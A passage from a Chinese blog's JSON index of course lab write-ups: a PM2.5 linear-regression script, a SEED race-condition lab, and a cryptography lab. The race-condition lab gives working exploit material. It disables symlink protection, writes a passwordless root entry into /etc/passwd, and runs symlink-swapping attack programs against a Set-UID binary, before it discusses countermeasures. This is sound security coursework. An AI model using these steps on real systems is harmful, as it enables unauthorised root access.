dtype=float) for i in range(240): test_x[i, :] = test_data[18 * i: 18 * (i + 1), :].reshape(1, -1) for i in range(len(test_x)): for j in range(len(test_x[0])): if std_x[j] != 0: test_x[i][j] = (test_x[i][j] - mean_x[j]) / std_x[j] test_x = np.concatenate((np.ones([240, 1]), test_x), axis=1).astype(float) # 添加偏置项 # 初始化线性回归模型的参数 # 特征维度为 18 * 9，加上偏置项 w_0 dim = 18 * 9 + 1 w = np.zeros([dim, 1]) # 初始化权重为 0 x_train_set = np.concatenate((np.ones([len(x_train_set), 1]), x_train_set), axis=1).astype(float) # 添加偏置项，x_train_set 的第一列为 1 x_validation = np.concatenate((np.ones([len(x_validation), 1]), x_validation), axis=1).astype(float) # 添加偏置项，x_validation 的第一列为 1 learning_rates = [0.05,0.1,0.2,0.3] # 学习率列表 iter_time = 20000 # 迭代次数 adagrad = np.zeros([dim, 1]) # Adagrad 累积梯度平方 eps = 1e-10 # 避免除以零 loss_list=[] # 训练集损失列表 validation_loss_list=[] # 验证集损失列表 loss_list_dict={} # 训练集损失字典 validation_loss_list_dict={} # 验证集损失字典 # 训练模型，使用 Adagrad 方法更新参数 print(\u0026#39;\\033[31m---------Training...---------\\033[32m\u0026#39;) for learning_rate in learning_rates: print(\u0026#39;learning rate = \u0026#39;+str(learning_rate)) for t in tqdm(range(iter_time)): loss = np.sqrt(np.sum((np.dot(x_train_set, w) - y_train_set) ** 2) / len(y_train_set)) # 计算 RMSE 损失 validation_loss = np.sqrt(np.sum((np.dot(x_validation, w) - y_validation) ** 2) / len(y_validation)) validation_loss_list.append(validation_loss) # print(str(t) + \u0026#34;:\u0026#34; + str(loss)) loss_list.append(loss) gradient = 2 * np.dot(x_train_set.T, (np.dot(x_train_set, w) - y_train_set)) # 计算梯度 adagrad += gradient ** 2 w = w - learning_rate * gradient / np.sqrt(adagrad + eps) # 更新权重 # 预测测试数据 predictions = np.dot(test_x, w) # 将预测结果写入文件 if learning_rate==0.2: with open(f\u0026#39;submit.csv\u0026#39;, mode=\u0026#39;w\u0026#39;) as submit_file: submit_file.write(\u0026#39;id,value\\n\u0026#39;) for i in range(240): # 由于预测结果可能为负数，将负数转换为 0 if (predictions[i][0] \u0026gt;= 0): submit_file.write(f\u0026#39;id_{i},{predictions[i][0]}\\n\u0026#39;) else: submit_file.write(f\u0026#39;id_{i},0.00\\n\u0026#39;) loss_list_dict[learning_rate]=loss_list validation_loss_list_dict[learning_rate]=validation_loss_list loss_list=[] validation_loss_list=[] np.save(f\u0026#39;weight_learning_rate{learning_rate}.npy\u0026#39;, w) # 保存模型参数 w=np.zeros([dim,1]) # 重新初始化权重 adagrad=np.zeros([dim,1]) # 重新初始化累积梯度平方 print(\u0026#39;\\033[34m---------Done!---------\\033[0m\u0026#39;) plt.figure(figsize=(10,6)) colors=[\u0026#39;r\u0026#39;,\u0026#39;g\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;y\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;m\u0026#39;,\u0026#39;k\u0026#39;,\u0026#39;w\u0026#39;] plt.ylim(0,30) plt.xlim(0,iter_time) for i, learning_rate in enumerate(learning_rates): plt.plot(range(iter_time),loss_list_dict[learning_rate],colors[i],label=\u0026#39;learning rate = \u0026#39;+str(learning_rate)) plt.xlabel(\u0026#39;iterations\u0026#39;) plt.ylabel(\u0026#39;loss\u0026#39;) plt.legend() # 添加图例 plt.grid() plt.title(\u0026#39;Training Loss\u0026#39;) plt.savefig(\u0026#39;Loss.png\u0026#39;) plt.show() 使用正则化优化后的线性回归代码 lr_L1L2.py： import pandas as pd import numpy as np import matplotlib.pyplot as plt from tqdm import tqdm # 读取训练数据集 data = pd.read_csv(\u0026#39;./train.csv\u0026#39;) # 处理数据，将 NR 替换为 0，并将数据转换为 numpy 数组 # 只选取有用的数据列 (从第四列开始) data = data.iloc[:, 3:] data[data == \u0026#39;NR\u0026#39;] = 0 raw_data = data.to_numpy() # 将数据按月份分割成 12 组，每个月有 18 行传感器数据，每行有 480 小时的数据 month_data = {} for month in range(12): sample = np.empty([18, 480]) for day in range(20): sample[:, day * 24: (day + 1) * 24] = raw_data[18 * (20 * month + day): 18 * (20 * month + day + 1), :] month_data[month] = sample # 构造训练数据 x 和标签数据 y，x 代表 9 小时的特征数据，y 代表第 10 小时的 PM2.5 数据 x = np.empty([12 * 471, 18 * 9], dtype=float) y = np.empty([12 * 471, 1], dtype=float) for month in range(12): for day in range(20): for hour in range(24): if day == 19 and hour \u0026gt; 14: # 最后一天只取到第 15 小时 continue x[month * 471 + day * 24 + hour, :] = month_data[month][:, day * 24 + hour: day * 24 + hour + 9].reshape(1, -1) y[month * 471 + day * 24 + hour, 0] = month_data[month][9, day * 24 + hour + 9] # 预测第 10 小时 PM2.5 值 # 对特征数据 x 进行标准化处理 mean_x = np.mean(x, axis=0) # 计算每个特征的均值 std_x = np.std(x, axis=0) # 计算每个特征的标准差 # 标准化特征数据 for i in range(len(x)): for j in range(len(x[0])): if std_x[j] != 0: # 避免除以零 x[i][j] = (x[i][j] - mean_x[j]) / std_x[j] # 划分训练集和验证集，80% 作为训练集，20% 作为验证集 import math x_train_set = x[:math.floor(len(x) * 0.8), :] y_train_set = y[:math.floor(len(y) * 0.8), :] x_validation = x[math.floor(len(x) * 0.8):, :] y_validation = y[math.floor(len(y) * 0.8):, :] # 初始化线性回归模型的参数 # 特征维度为 18 * 9，加上偏置项 w_0 dim = 18 * 9 + 1 w = np.zeros([dim, 1]) # 初始化权重为 0 x_train_set = np.concatenate((np.ones([len(x_train_set), 1]), x_train_set), axis=1).astype(float) # 添加偏置项，x_train_set 的第一列为 1 x_validation = np.concatenate((np.ones([len(x_validation), 1]), x_validation), axis=1).astype(float) # 添加偏置项，x_validation 的第一列为 1 learning_rate = 0.2 # 学习率 iter_time = 20000 # 迭代次数 adagrad = np.zeros([dim, 1]) # Adagrad 累积梯度平方 eps = 1e-10 # 避免除以零 # 正则化参数 lambda_l1 = 0.0005 # L1 正则化系数 lambda_l2 = 0.0005 # L2 正则化系数 loss_list = [] validation_loss_list = [] # 训练模型，使用 L1 和 L2 正则化的 Adagrad 方法更新参数 for t in tqdm(range(iter_time)): # 计算训练集损失 (RMSE) loss = np.sqrt(np.sum((np.dot(x_train_set, w) - y_train_set) ** 2) / len(y_train_set)) # 添加 L1 和 L2 正则化项到损失函数中 loss += lambda_l1 * np.sum(np.abs(w)) + lambda_l2 * np.sum(w ** 2) validation_loss = np.sqrt(np.sum((np.dot(x_validation, w) - y_validation) ** 2) / len(y_validation)) validation_loss_list.append(validation_loss) loss_list.append(loss) # 计算梯度 gradient = 2 * np.dot(x_train_set.T, (np.dot(x_train_set, w) - y_train_set)) # 添加 L1 正则化梯度 gradient += lambda_l1 * np.sign(w) # 添加 L2 正则化梯度 gradient += 2 * lambda_l2 * w # 使用 Adagrad 更新参数 adagrad += gradient ** 2 w = w - learning_rate * gradient / np.sqrt(adagrad + eps) # 绘制训练集和验证集的损失曲线 plt.figure(figsize=(10, 6)) plt.plot(range(iter_time), loss_list, \u0026#39;b\u0026#39;, label=\u0026#39;Training Loss\u0026#39;) plt.plot(range(iter_time), validation_loss_list, \u0026#39;r\u0026#39;, label=\u0026#39;Validation Loss\u0026#39;) plt.xlabel(\u0026#39;Iterations\u0026#39;) plt.ylabel(\u0026#39;Loss (RMSE)\u0026#39;) plt.legend() # 添加图例 plt.grid() plt.title(\u0026#39;Training and Validation Loss with L1 and L2 Regularization\u0026#39;) plt.savefig(\u0026#39;loss_l1l2.png\u0026#39;) plt.show() ","permalink":"https://smera1d0.github.io/posts/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8-linear-regression-%E9%A2%84%E6%B5%8B-pm2.5-%E6%95%B0%E5%80%BC/","summary":"\u003ch2 id=\"一实验目的\"\u003e一、实验目的\u003c/h2\u003e\n\u003cp\u003e利用即墨站的空气质量监测数据，使用线性回归（Linear Regression）预测 PM2.5 的数值。\u003c/p\u003e\n\u003ch2 id=\"二实验环境\"\u003e二、实验环境\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e操作系统：Windows 11\u003c/li\u003e\n\u003cli\u003e处理器：AMD Ryzen 7 5800H with Radeon Graphics (3.20 GHz)\u003c/li\u003e\n\u003cli\u003e显卡：NVIDIA GeForce GTX 1650\u003c/li\u003e\n\u003cli\u003e运行环境：\n\u003cul\u003e\n\u003cli\u003ePython 3.10.11\u003c/li\u003e\n\u003cli\u003epandas 2.1.0\u003c/li\u003e\n\u003cli\u003enumpy 1.24.2\u003c/li\u003e\n\u003cli\u003ematplotlib 3.7.1\u003c/li\u003e\n\u003cli\u003etqdm 4.66.1\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"三数据说明\"\u003e三、数据说明\u003c/h2\u003e\n\u003ch3 id=\"1-训练集train-set\"\u003e1. 训练集（Train Set）\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003etrain.csv\u003c/code\u003e包含了  2014 年 1 月 1 日至 2014 年 12 月 20 日的即墨站的全部监测数据，使用 VScode 插件转成表格形式如下所示：\u003c/p\u003e","title":"【机器学习】使用 Linear Regression 预测 PM2.5 数值"},{"content":"1. 环境设置 1.1 关闭反制措施 使用 neofetch 查看 Ubuntu 版本信息，如下所示：\nUbuntu 20.04 引入了一种安全机制，防止 root 用户写入 /tmp 中其他人拥有的文件。使用下面的命令禁用这个安全机制：\n// On Ubuntu 20.04, use the following: $ sudo sysctl -w fs.protected_symlinks=0 $ sudo sysctl fs.protected_regular=0 然后将漏洞程序 vulp.c 编译并设置为 Set-UID 程序：\n2. Task 1：选择目标 Ubuntu live CD 中有一个用于无口令帐户的 magic 值 U6aMy0wojraho（第 6 个字符是零而非字母 O）。如果我们把这个值放在用户条目的口令字段中，我们只需要在提示输入口令时敲击回车键即可登录。\n任务 为了验证 magic 值口令是否有效，我们（作为超级用户）手动将以下条目添加到/etc/passwd 文件的末尾。请在报告中说明你是否可以在不键入口令的情况下登录 test 账户，并检查你是否具有 root 权限。\n将以下内容添加进 /etc/passwd 文件中：\ntest:U6aMy0wojraho:0:0:test:/root:/bin/bash 切换到 test 账户，无需键入口令，并且具有 root 权限。\n3. Task 2：发起竞争条件攻击 3.1 Task 2.A：模拟一个缓慢的机器 假设机器非常慢，在 access() 和 fopen() 调用之间有一个 10 秒的时间窗口。为了模拟这种情况， 我们在它们之间添加了 sleep(10)。\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { char* fn = \u0026#34;/tmp/XYZ\u0026#34;; char buffer[60]; FILE* fp; /* get user input */ scanf(\u0026#34;%50s\u0026#34;, buffer); if (!access(fn, W_OK)) { sleep(10); //\u0026lt;- 10s time window fp = fopen(fn, \u0026#34;a+\u0026#34;); if (!fp) { perror(\u0026#34;Open failed\u0026#34;); exit(1); } fwrite(\u0026#34;\\n\u0026#34;, sizeof(char), 1, fp); fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp); } else { printf(\u0026#34;No permission \\n\u0026#34;); } return 0; } 然后重新编译并设置为 Set-UID 程序，并创建一个 /tmp/XYZ 文件。\n运行程序时，输入 test:U6aMy0wojraho:0:0:test:/root:/bin/bash，利用 10 秒的时间窗口，将 /tmp/XYZ 设置为指向 /etc/passwd 的符号链接，使用命令：\nln -sf /etc/passwd /tmp/XYZ (f表示如果存在链接，则先删除链接) 如下所示：\n然后此时查看 /etc/passwd 的内容，发现 test:U6aMy0wojraho:0:0:test:/root:/bin/bash 已经被写入。\n切换 test 用户，无需密码即可获得 root 权限：\n3.2 Task 2.B：进行真实攻击 首先删除 sleep(10) 重新编译并设置成 Set-UID 程序。\n3.2.1 编写攻击程序 我们可以使用以下的函数删除链接和创建链接：\nunlink(\u0026#34;/tmp/XYZ\u0026#34;); symlink(\u0026#34;/etc/passwd\u0026#34;,\u0026#34;/tmp/XYZ\u0026#34;); 由于 Linux 不允许在已经存在链接的时候创建链接，所以我们每次在创建链接前都需要先删除链接。\n于是我们可以写出这样的攻击脚本：\n// attack.c #include \u0026lt;unistd.h\u0026gt; int main(){ while(1){ unlink(\u0026#34;/tmp/XYZ\u0026#34;); symlink(\u0026#34;/etc/passwd\u0026#34;,\u0026#34;/tmp/XYZ\u0026#34;); usleep(100); } return 0; } 通过一个 while 循环，不断的删除链接和创建 tmp/XYZ 和 /etc/passwd 之间的链接。\n然后编写 target_process.sh ，利用 echo 和管道符进行程序的输入。\n#!/bin/bash CHECK_FILE=\u0026#34;ls -l /etc/passwd\u0026#34; old=$($CHECK_FILE) new=$($CHECK_FILE) while [ \u0026#34;$old\u0026#34; == \u0026#34;$new\u0026#34; ] do echo \u0026#34;test:U6aMy0wojraho:0:0:test:/root:/bin/bash\u0026#34; | ./vulp new=$($CHECK_FILE) done echo \u0026#34;STOP... The passwd file has been changed\u0026#34; 利用 ls -l /etc/passwd 输出的文件修改时间，如果文件修改时间发生变化，说明竞争条件漏洞利用成功，/etc/passwd 文件被修改，此时停止脚本的运行。\n3.2.2 运行漏洞程序并观察结果 首先运行 attack 攻击脚本。 然后运行 target_process.sh 脚本，不断的运行漏洞程序。 3.2.3 验证是否成功 查看 /etc/passwd ，发现 test:U6aMy0wojraho:0:0:test:/root:/bin/bash 成功写入：\n切换 test 用户，无需密码成功获得 root 权限：\n3.3 Task 2.C：一种改进的攻击方法 在 Task 2.B 中，我们的攻击可能失败，原因是我们编写的攻击脚本也存在着竞争条件漏洞，当执行 unlink 操作删除 /tmp/XYZ 之后，如果执行了 fopen 操作，就会创建一个所有者为 root 的 /tmp/XYZ ，下一次 unlink 操作就无法删除 /tmp/XYZ。这是因为 /tmp 文件夹上有一个“粘滞”位，意为只有文件的所有者才能删除该文件，即使该文件夹可写。\n// attack.c unlink(\u0026#34;/tmp/XYZ\u0026#34;); \u0026lt;- 以 seed 身份 unlink // vulp.c fp = fopen(fn, \u0026#34;a+\u0026#34;); \u0026lt;- 以 root 身份 fopen，文件所有者变为 root // attack.c unlink(\u0026#34;/tmp/XYZ\u0026#34;); \u0026lt;- 以 seed 身份无法 unlink 为了解决这个问题，我们需要将 unlink 和 symlink 操作原子化，幸运的是，有一个系统调用允许我们实现这一点。更准确地说，它允许我们原子地交换两个符号链接。下面的程序首先创建两个符号链接 /tmp/XYZ 和 /tmp/ABC，然后使用 renameat2 系统调用来原子地交换它们。这允许我们在不引入任何竞争条件的情况下更改 /tmp/XYZ 指向的内容。\n我们可以写入如下所示的改进的攻击脚本：\n//attack_new.c #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { unsigned int flags = RENAME_EXCHANGE; while(1){ unlink(\u0026#34;/tmp/XYZ\u0026#34;); symlink(\u0026#34;/dev/null\u0026#34;, \u0026#34;/tmp/XYZ\u0026#34;); usleep(100); unlink(\u0026#34;/tmp/ABC\u0026#34;); symlink(\u0026#34;/etc/passwd\u0026#34;, \u0026#34;/tmp/ABC\u0026#34;); usleep(100); renameat2(0, \u0026#34;/tmp/XYZ\u0026#34;, 0, \u0026#34;/tmp/ABC\u0026#34;, flags); } return 0; } 使用上面的攻击脚本再次尝试攻击：\n切换 test 用户，无需密码成功获得 root 权限：\n4. Task 3：预防措施 4.1 Task 3.A：应用最小权限原则 读取 /tmp/XYZ 文件并不需要 root 权限，根据最小权限原则，如果我们不需要 root 权限，我们就要禁用这个权限，因此我们可以使用 seteuid 系统调用暂时禁用 root 权限，确保进程的权限与当前执行者的权限一致，修改后的代码如下所示：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { char* fn = \u0026#34;/tmp/XYZ\u0026#34;; char buffer[60]; FILE* fp; seteuid(getuid()); //修改进程的euid为执行者的uid /* get user input */ scanf(\u0026#34;%50s\u0026#34;, buffer); if (!access(fn, W_OK)) { fp = fopen(fn, \u0026#34;a+\u0026#34;); if (!fp) { perror(\u0026#34;Open failed\u0026#34;); exit(1); } fwrite(\u0026#34;\\n\u0026#34;, sizeof(char), 1, fp); fwrite(buffer, sizeof(char), strlen(buffer), fp); fclose(fp); } else { printf(\u0026#34;No permission \\n\u0026#34;); } return 0; } 编译并设为 Set-UID 程序，再次执行攻击脚本。\n**观察结果：**发现攻击失败，出现了 Open failed: Permission denied。\n**解释：**由于进程的 euid 被设置成了 seed ，通过了 access() 函数的检测之后，就算修改了符号链接，也无法打开 /etc/passwd ，原因是 /etc/passwd 是 root 可写的，seed 不可写，因此会输出 Open failed: Permission denied。\n4.2 Task 3.B：使用 Ubuntu 内置方案 Ubuntu 10.10 和更高版本附带了一个内置的防止竞争条件攻击的保护方案。使用下面的命令重新开启保护：\n// On Ubuntu 16.04 and 20.04, use the following command: $ sudo sysctl -w fs.protected_symlinks=1 // On Ubuntu 12.04, use the following command: $ sudo sysctl -w kernel.yama.protected_sticky_symlinks=1 再次运行攻击脚本。\n**观察结果：**发现攻击失败，输出 Open failed: Permission denied。\n查阅 Linux Kernel 的文档（https://www.kernel.org/doc/html/latest/admin-guide/sysctl/fs.html#protected-symlinks）发现了该保护方案的机制：\nQ:（1）该保护方案是如何工作的？\nA：\n结合 Linux Kernel 的文档和 SEED book，设这样一个三元组：（跟随者，目录所有者，符号链接所有者），跟随者是进程的有效用户，目录所有者是目录的拥有者，符号链接所有者是创建该符号链接的用户，当符号链接的所有者与跟随者相同，或者与目录所有者相同，fopen 的操作就会被允许，否则 fopen 的操作就会失败。\n发起攻击的时候，符号链接的所有者是 seed，而 /tmp 目录的所有者和跟随者都是 root，因此 fopen 的操作会失败，所以会输出 Open failed: Permission denied，进而攻击失败。\nQ:（2）这个方案有什么局限性？\nA：\n如果建立符号链接的文件所在目录的所有者是 seed，那么这个保护机制将会失败。 限制了系统的灵活性，如果一个 root 用户想通过一个程序访问一个 root 拥有的目录下的 seed 拥有的符号链接，那么就会访问失败。 在某些场景下可能带来兼容性问题，如果其他程序依赖不同用户下的符号链接机制，这个程序可能无法正常运行。 5. 思考题 Q1\t下面的 Set-UID 程序是否有竞争条件漏洞？并请解释。\nif (!access(\u0026#34;/etc/passwd\u0026#34;, W_OK)) { /* the real user has the write permission*/ f = open(\u0026#34;/tmp/X\u0026#34;, O_WRITE); write_to_file(f); } else { /* the real user does not have the write permission */ fprintf(stderr , \u0026#34;Permission denied\\n\u0026#34;); } 存在竞争条件漏洞。\n解释：首先，if 判断会检查用户对 /etc/passwd 是否有写权限，而且 access() 函数检查的是用户的真实 id，并且普通用户是无法将 /etc/passwd 设置符号链接的，所以能通过 if 判断的都是 root 用户，这让我感到迷惑，都拥有 root 权限了，还需要通过修改符号链接的方式进行攻击吗？\n通过了 if 判断后，攻击者可以将 /tmp/X 设置为指向攻击者想要写入的文件的符号链接，这样执行open 就会打开攻击者想要写入的文件，并执行 write_to_file(f) 对该文件进行写入。\n存在漏洞的原因是检查文件和打开文件是两个分离的操作，攻击者可以利用中间的时间窗口对文件进行替换，进行攻击。\n","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-5-%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/","summary":"\u003ch2 id=\"1-环境设置\"\u003e1. 环境设置\u003c/h2\u003e\n\u003ch3 id=\"11-关闭反制措施\"\u003e1.1 关闭反制措施\u003c/h3\u003e\n\u003cp\u003e使用 neofetch 查看 Ubuntu 版本信息，如下所示：\u003c/p\u003e\n\u003cimg src=\"https://s2.loli.net/2024/11/24/wm3OTqWn4YuVAH1.png\" alt=\"image-20241124110138581\" style=\"zoom: 50%;\" /\u003e\r\n\u003cp\u003eUbuntu 20.04 引入了一种安全机制，防止 root 用户写入 /tmp 中其他人拥有的文件。使用下面的命令禁用这个安全机制：\u003c/p\u003e","title":"SEEDlab—竞争条件漏洞"},{"content":"Task 1：使用不同的加密算法和加密模式加密 1. AES-128-CBC 模式加密 使用 OpenSSL 随机生成 128bit 的 Key 和 IV\n$ openssl rand -hex 16 使用OpenSSL对明文进行加密\n2. AES-128-CFB 模式加密 3. Blowfish-CBC 模式加密 Task 2：加密模式：ECB vs. CBC 1. 首先分别使用 AES-128-CBC 和 AES-128-ECB 模式加密图片 使用 AES-128-CBC 加密得到 p1.bmp 使用 AES-128-ECB 加密得到 p2.bmp 2. 使用图片的图片头进行拼接 3. 查看加密后的图片 左为CBC模式，中间为原始图像，右为ECB模式。\n现象：我们可以发现，使用CBC模式加密的图片已经失去了所有图像特征，但使用ECB模式加密的图片还可以显示出原有的 Apple Logo 的轮廓信息。\n解释：这与CBC和ECB模式的加密方式有关，CBC模式每一个数据块在加密时都依赖于前一个块的密文，因此即使原始数据相同，加密出的密文也会有所不同，因此不会泄露图像的轮廓特征，而ECB加密模式中，每一个数据块都是独立加密的，相同的原始数据加密后得到的密文也相同，因此对于图片这种重复模式较强的文件，相同的部分加密后会产生相同的加密块，从而泄露图片的结构信息。\n4. 对 sample.bmp 进行加密 左为CBC模式，中间为原始图像，右为ECB模式。\n这张图片使用CBC和ECB加密后都没有明显的特征了，原因是这张图片没有大面积的重复的色块，即使使用ECB模式加密也不会泄露图片的结构信息。\nTask 3：错误传播 – 被破坏的密文 答： 能从 CBC 中恢复 $总字节数-17字节$ 的信息，能从ECB中恢复 $总字节数-16字节$ 的信息。\n1. 创建一个至少 1000 字节长的文本文件。 2. 分别使用AES-128-CBC和AES-128-ECB加密 3. 分别修改加密后文件的第55个字节 使用bless修改偏移为0x36位置（偏移从0开始）的字节，分别修改一个比特。\n4. 使用正确的Key和IV进行解密 5. 与原文件进行对比 使用 cmp 命令逐位比较原文件和解密文件的不同的字节数，并使用 wc -l 统计不同的总字节数。\n**现象：**发现 cbc 模式下，密文 1 bit 的错误会导致解密出的明文 17 字节的错误，而 ecb 模式下，密文 1 bit 的错误会导致解密出的明文 16 字节的错误。\n原因：\nECB模式下每个 16 字节的块单独加密，因此该错误比特只会影响自己所在的块的解密，因此会导致解密明文的 16 字节的错误 CBC模式下，每一个块的解密依赖于前一个块的密文，会导致当前的块的 16 个字节解密错误，同时因为密文块有 1 bit的错误，会影响下一个块的首字节的解密，导致下一个块的首字节解密错误，因此一共产生 17 个字节的错误。 Task 4：寻找密钥 使用以下代码可以找到密钥：\nfrom Crypto.Cipher import AES import binascii plaintext = b\u0026#34;This is a top secret.\u0026#34; ciphertext_hex = ( \u0026#34;e29652fd35eb14b222f9a90d97902d2d\u0026#34; \u0026#34;eef000978fa0952d7a98bbe0e251286b\u0026#34; ) iv_hex = \u0026#34;010203040506070809000a0b0c0d0e0f\u0026#34; # 转换为字节 ciphertext = binascii.unhexlify(ciphertext_hex) iv = binascii.unhexlify(iv_hex) # 构造密钥并解密 def decrypt_with_key(word): # 不足16字节补`#` key = word.ljust(16, \u0026#34;#\u0026#34;).encode(\u0026#34;utf-8\u0026#34;) # 初始化AES解密器 cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = cipher.decrypt(ciphertext) # 检查解密是否成功 if decrypted.strip() == plaintext: return True, word return False, None # 从文件加载单词列表 with open(\u0026#34;words.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: words = f.read().splitlines() # 逐一尝试密钥 for word in words: if len(word)\u0026lt;=16: success, key = decrypt_with_key(word) if success: print(f\u0026#34;找到正确的密钥：{key}\u0026#34;) break else: print(\u0026#34;未找到正确的密钥。\u0026#34;) 通过对 word.txt 字典文件的遍历，找到了正确的密钥为：snowstorm\nTask 5：生成消息摘要 使用 sha1, sha256, md5, sm3 等算法生成消息摘要，如下所示：\n现象：不同算法生成的消息摘要的长度不同，见下表：\n算法 消息摘要长度 SHA-1 160 位（20 字节） SHA-256 256 位（32 字节） MD5 128 位（16 字节） SM3 256 位（32 字节） Task 6：哈希函数的输出特性 1. 使用 SHA-1 算法生成哈希值 H1 2. 修改 plain.txt 的一个比特，再使用 SHA-1 算法生成哈希值 H2 使用 bless 修改 plain.txt 的第一位，将 49 改为 59 使用 SHA-1 算法生成哈希值 H2 3. 对比 H1 和 H2 发现 H1 和 H2 并不相似，这说明即使文件只有 1 bit 不同，生成的消息摘要值就完全不同。\nTask 7：单向性与抗碰撞性 编写一个 C 程序，通过生成随机字符串寻找与origin.txt前 24 比特相同的文件：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;openssl/sha.h\u0026gt; #include \u0026lt;time.h\u0026gt; // 计算文件的 SHA1 哈希值，并返回前 24 位 void compute_sha1_prefix(const char *filename, unsigned char *sha1_prefix) { FILE *file = fopen(filename, \u0026#34;rb\u0026#34;); if (file == NULL) { perror(\u0026#34;File opening failed\u0026#34;); exit(1); } // 计算文件的 SHA1 哈希 SHA_CTX sha_ctx; SHA1_Init(\u0026amp;sha_ctx); unsigned char buffer[1024]; size_t bytes_read; while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) \u0026gt; 0) { SHA1_Update(\u0026amp;sha_ctx, buffer, bytes_read); } fclose(file); unsigned char sha1_hash[SHA_DIGEST_LENGTH]; SHA1_Final(sha1_hash, \u0026amp;sha_ctx); // 只取前 24 位，即前 3 字节 memcpy(sha1_prefix, sha1_hash, 3); } // 计算字符串的 SHA1 哈希值 void compute_sha1_string(const char *str, unsigned char *sha1_hash) { SHA_CTX sha_ctx; SHA1_Init(\u0026amp;sha_ctx); SHA1_Update(\u0026amp;sha_ctx, str, strlen(str)); SHA1_Final(sha1_hash, \u0026amp;sha_ctx); } // 将 SHA1 哈希值的前 24 位转换为十六进制字符串 void sha1_prefix_to_hex(const unsigned char *sha1_prefix, char *output) { for (int i = 0; i \u0026lt; 3; ++i) { sprintf(output + i * 2, \u0026#34;%02x\u0026#34;, sha1_prefix[i]); } output[6] = \u0026#39;\\0\u0026#39;; // 确保字符串以 \u0026#39;\\0\u0026#39; 结束 } // 将碰撞的随机字符串写入文件 void write_collision_to_file(const char *filename, const char *str) { FILE *file = fopen(filename, \u0026#34;wb\u0026#34;); // 使用 \u0026#39;wb\u0026#39; 模式，以二进制模式写入内容 if (file == NULL) { perror(\u0026#34;Failed to open file for writing\u0026#34;); exit(1); } // 将随机字符串逐字节写入文件（不添加换行符或其他字符） fwrite(str, 1, strlen(str), file); fclose(file); } int main() { srand(time(NULL)); // 用时间作为随机数种子 // Step 1: 计算 original.txt 文件的 SHA1 哈希值并获取前 24 位 unsigned char original_sha1_prefix[3]; compute_sha1_prefix(\u0026#34;original.txt\u0026#34;, original_sha1_prefix); // 将前 24 位 SHA1 哈希值转换为十六进制字符串 char original_sha1_hex[7]; sha1_prefix_to_hex(original_sha1_prefix, original_sha1_hex); printf(\u0026#34;Original file SHA1 prefix (24 bits): %s\\n\u0026#34;, original_sha1_hex); // Step 2: 进行10次实验并记录尝试次数 int total_attempts = 0; int num_experiments = 10; // 实验次数 char last_collision_string[100]; // 保存最后一次实验找到的随机字符串 for (int exp = 0; exp \u0026lt; num_experiments; ++exp) { int attempts = 0; unsigned char test_sha1_hash[SHA_DIGEST_LENGTH]; char test_string[100]; unsigned char test_sha1_prefix[3]; char test_sha1_hex[7]; while (1) { // 生成一个随机字符串 int len = rand() % 50 + 1; // 随机生成字符串长度，1 到 50 字符 for (int i = 0; i \u0026lt; len; ++i) { test_string[i] = \u0026#39;a\u0026#39; + rand() % 26; // 生成 \u0026#39;a\u0026#39; 到 \u0026#39;z\u0026#39; 的随机字符 } test_string[len] = \u0026#39;\\0\u0026#39;; // 结束符 // 计算该字符串的 SHA1 哈希值 compute_sha1_string(test_string, test_sha1_hash); // 提取前 24 位哈希值 memcpy(test_sha1_prefix, test_sha1_hash, 3); // 转换为十六进制字符串进行比较 sha1_prefix_to_hex(test_sha1_prefix, test_sha1_hex); // 比较前 24 位是否相同 if (strncmp(original_sha1_hex, test_sha1_hex, 6) == 0) { // 找到碰撞，保存随机字符串 strcpy(last_collision_string, test_string); break; // 退出循环 } attempts++; } total_attempts += attempts; printf(\u0026#34;Experiment %d: Found collision after %d attempts\\n\u0026#34;, exp + 1, attempts); } // Step 3: 计算平均尝试次数 float average_attempts = total_attempts / (float)num_experiments; printf(\u0026#34;Average number of attempts: %.2f\\n\u0026#34;, average_attempts); // Step 4: 将最后一次实验找到的随机字符串写入文件 write_collision_to_file(\u0026#34;collision_result.txt\u0026#34;, last_collision_string); printf(\u0026#34;Last collision string written to collision_result.txt: %s\\n\u0026#34;, last_collision_string); return 0; } 使用以下命令编译这个 C 源码：\ngcc -o sha1_collision sha1_collision.c -lssl -lcrypto 进行 10 次实验，计算爆破所需的平均次数，并将最后一次的结果写入文件，如下所示：\n找到的文本如下：\nzeurmhgukcoxjrbdrzecxweicdfvrmjqsfhgopbatpyfi 验证与 origin.txt 的 sha1 值的前 24 bit 是否一致：\n发现确实是一致的。\n","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-7--%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8%E5%AE%9E%E9%AA%8C/","summary":"\u003ch2 id=\"task-1使用不同的加密算法和加密模式加密\"\u003eTask 1：使用不同的加密算法和加密模式加密\u003c/h2\u003e\n\u003ch3 id=\"1-aes-128-cbc-模式加密\"\u003e1. AES-128-CBC 模式加密\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e使用 OpenSSL 随机生成 